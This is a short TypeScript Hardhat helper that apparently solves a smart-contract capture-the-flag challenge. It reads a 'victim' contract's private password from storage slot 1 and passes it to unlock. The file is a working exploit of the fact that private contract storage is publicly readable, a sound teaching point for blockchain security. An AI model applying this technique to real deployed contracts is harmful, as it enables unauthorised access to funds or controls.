import { expect } from "chai";
import { ethers, waffle } from "hardhat";

const helper = async (victim: any) => {
  const bytesPassword = await victim.provider.getStorageAt(victim.address, 1);
  await victim.unlock(bytesPassword);
};

export default helper;
